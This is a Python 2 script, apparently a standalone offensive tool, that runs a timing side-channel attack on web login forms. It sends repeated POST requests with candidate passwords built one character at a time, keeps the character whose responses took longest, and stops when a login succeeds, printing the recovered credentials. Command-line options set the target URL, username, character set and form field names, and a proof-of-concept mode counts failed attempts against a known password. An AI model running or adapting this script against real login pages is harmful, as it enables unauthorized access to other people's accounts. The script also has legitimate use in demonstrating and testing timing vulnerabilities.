#!/usr/bin/env python
'''
    This script attempts to perform timing attacks on web applications. It will
    make a given number of requests to a web server with a specified character 
    set. It will then take the average of the amount of time it took for each 
    character to be processed, and add the most likely character to the 
    variable containing what is guessed to be the correct password.
'''

import time
import requests
import string
import sys
import argparse

def makerequest(guess):
    '''
        Makes the request to the server with the username/password combo.
        Passes a dict containing the character and a value containing the 
        total amount of time it took for the server to respond to all of 
        the requests containing that character

        Return: the substring of the assumed value for the correct password 
        (based on the highest time value in the dict of characters)
    '''
    chartimes = {}
    chartimeavg = {}
    global FAILEDPOCS
    global KNOWNPASSWORD


    # for every character in the characterset, make a request
    for c in CHARSET:
        newguess = guess + c

        # initialize the time for the character to be 0
        chartimes[c] = 0.0

        print "Sending " + str(NUMREQUESTS) + " requests to the server for the password '" + newguess + "'"
        parameters = {USERNAMEPOSTPARAM: USERNAME, PASSWORDPOSTPARAM: newguess}
        for i in range(0,NUMREQUESTS):
            start = time.time()
            # make request
            r = requests.post(URL, data=parameters)
            end = time.time()

            # if the response doesn't contain the following string, you successfully logged in and now have the password
            if FAILLOGINMESSAGE not in r.text:
                print "SUCCESS: Number of failed timing attack attempts before success: " + str(FAILEDPOCS)
                print "Successfully logged in! Username: " + USERNAME + " Password: " + newguess
                sys.exit()
            #print "response is: " + r.text
            chartimes[c] += end - start
            if i == NUMREQUESTS-1:
                print "Total time to make " + str(NUMREQUESTS) + " requests for '" + c + "' was " + str(chartimes[c]) + " seconds."

    # get avg of chartimes
    chartimeavg = getaverage(chartimes)

    # create a counter for the following for loop
    n = 0

    # sort the characters based on the average time
    print "Average time per request for each password guess"
    for key, value in sorted(chartimeavg.iteritems(), key=lambda (k,v): (v,k)):
        print "%s: %s" % (key, value)
        if n == len(chartimeavg.keys())-1:
            newguess = guess + key
            print "Guessing password begins with: '" + newguess + "'"
            # if performing a PoC test
            if KNOWNPASSWORD is not False:
                if newguess != KNOWNPASSWORD[:len(newguess)]:
                    print "'" + newguess + "' != '" + KNOWNPASSWORD[:len(newguess)] + "'"
                    FAILEDPOCS += 1
                    print "Number of failed timing attack attempts: " + str(FAILEDPOCS) + "\n"
                    main()
            return newguess
        n += 1



def getaverage(chartimes):
    '''
        Takes the passed parameter (chartimes) as a dict. The key:value pairs 
        are character: total_time where total_time is the total amount of time 
        it took the server to respond to all of the requests for that character
        collectively.

        Return: the dict in a key:value pair where the value is the average 
        amount of time for all of the requests 
    '''
    chartimeavg = {}

    # get average time for each request for every character
    for char in chartimes:
        chartimeavg[char] = chartimes[char]/NUMREQUESTS

    return chartimeavg


def main():
    temppass = ''

    print "Attempting to log into " + URL + " as user '" + USERNAME + "'"
    print "Character set is: " + CHARSET
    print "Failed login message is: 'Invalid username/password combination'"
    print "----------------------------------------------------------------\n"

    while True:
        temppass = makerequest(temppass)

if __name__ == '__main__':

    parser = argparse.ArgumentParser(description='Perform a timing attack to log into a remote web application')
    parser.add_argument('--url', help='The URL to target (ex. http://example.com/login/', dest="url",  required="True")
    parser.add_argument('-n', help="The number of requests to send per character", dest="numreqs", required="True")
    parser.add_argument('-F', help="The message displayed on the HTTP response indicating a failed login. Example: 'Invalid username/password combination'", dest="failedlogin", required="True")
    parser.add_argument('-u', help="The username to attempt to log in to", dest="username", required="True")
    parser.add_argument('-c', help='The character set to use for guessing', dest="charset", default="abcde")
    parser.add_argument('-U', help="username POST parameter variable name", dest="postusername", default="username")
    parser.add_argument('-P', help="password POST parameter variable name", dest="postpassword", default="password")
    parser.add_argument('--poc-password', help="The known password. This is to run the application in proof-of-concept mode to count the number of failed attempts before a succesful timing attack is performed", dest="poc", default=False)
    
    args = parser.parse_args()

    # for when running in proof of concept mode
    # this will keep track of the number of failed times the program executes before
    # it is able to get the correct password through a timing attack
    KNOWNPASSWORD = args.poc
    FAILEDPOCS = 0
    
    USERNAME = args.username
    URL = args.url
    #CHARSET = string.ascii_lowercase
    CHARSET = args.charset
    
    # Message that comes in the response when the login fails
    FAILLOGINMESSAGE = args.failedlogin
    
    # set to be the number of requests to set to the server for every character
    NUMREQUESTS = int(args.numreqs)
    
    # POST parameter variable names
    USERNAMEPOSTPARAM = args.postusername
    PASSWORDPOSTPARAM = args.postpassword

    print "KNOWNPASSWORD type is " + str(type(KNOWNPASSWORD))

    main()
